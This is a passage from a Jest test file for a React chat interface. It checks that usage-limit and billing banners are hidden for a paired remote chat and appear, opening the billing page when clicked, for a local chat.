        read: jest.fn().mockResolvedValue(null),
        onChanged: jest.fn().mockReturnValue((): void => undefined),
      },
    };

    const openBillingSpy = jest
      .spyOn(openBillingPageModule, 'openBillingPage')
      .mockResolvedValue('web');

    const pairedTarget = {
      projectId: qMac('proj-bill'),
      worktreeId: qMac('wt-bill'),
      chatId: qMac('chat-bill'),
    };
    const localTarget = {
      projectId: 'local-proj-bill',
      worktreeId: 'local-wt-bill',
      chatId: 'local-chat-bill',
    };

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    try {
      useAiCreditsBannerStore
        .getState()
        .setUsageLimit(pairedTarget, { provider: 'claude' });
      useAiCreditsBannerStore
        .getState()
        .setUsageLimit(localTarget, { provider: 'claude' });

      const providerChoiceContext = {
        current: 'claude' as const,
        currentModel: {
          id: 'claude-sonnet-4-6' as const,
          label: 'Sonnet 4.6',
        },
        accountSources: [],
        credits: { runsTargetModel: true },
        onUse: (): Promise<boolean> => Promise.resolve(false),
        formatResetsAt: (): string => '12:00 PM',
      };
      await act(async () => {
        root.render(
          createElement(
            'div',
            null,
            createElement(AiCreditsUsageLimitBanner, {
              target: pairedTarget,
              providerChoice: providerChoiceContext,
              modelRoutability: 'routable',
            }),
            createElement(AiCreditsRoutingStatusBanner, {
              target: pairedTarget,
              active: true,
              turnActive: false,
              provider: 'claude',
            }),
          ),
        );
        for (let i = 0; i < 4; i += 1) await Promise.resolve();
      });
      expect(
        container.querySelector(
          '[data-testid="chat-input-usage-limit-banner"]',
        ),
      ).toBeNull();
      expect(
        container.querySelector(
          '[data-testid="chat-input-usage-limit-view-plans"]',
        ),
      ).toBeNull();
      expect(loadAvailabilitySpy).not.toHaveBeenCalled();
      expect(openBillingSpy).not.toHaveBeenCalled();

      // Local-scope positive control.
      await act(async () => {
        root.render(
          createElement(AiCreditsUsageLimitBanner, {
            target: localTarget,
            providerChoice: providerChoiceContext,
            modelRoutability: 'routable',
          }),
        );
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(
        container.querySelector(
          '[data-testid="chat-input-usage-limit-banner"]',
        ),
      ).not.toBeNull();
      let buyBtn = document.querySelector<HTMLButtonElement>(
        '[data-testid="chat-input-usage-limit-view-plans"]',
      );
      if (buyBtn === null) {
        const providerChoiceBtn = container.querySelector<HTMLButtonElement>(
          '[data-testid="chat-input-usage-limit-provider-choice"]',
        );
        expect(providerChoiceBtn).not.toBeNull();
        await act(async () => {
          providerChoiceBtn?.click();
          for (let i = 0; i < 6; i += 1) await Promise.resolve();
        });
        buyBtn = document.querySelector<HTMLButtonElement>(
          '[data-testid="provider-choice-action-credits"]',
        );
      }
      expect(buyBtn).not.toBeNull();
      await act(async () => {
        buyBtn?.click();
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(openBillingSpy).toHaveBeenCalled();
    } finally {
      act(() => {
        root.unmount();
      });
      container.remove();
      useAiCreditsBannerStore.getState().clearForChat(pairedTarget);
      useAiCreditsBannerStore.getState().clearForChat(localTarget);
      openBillingSpy.mockRestore();
      window.api = prevApi;
    }
  });
});
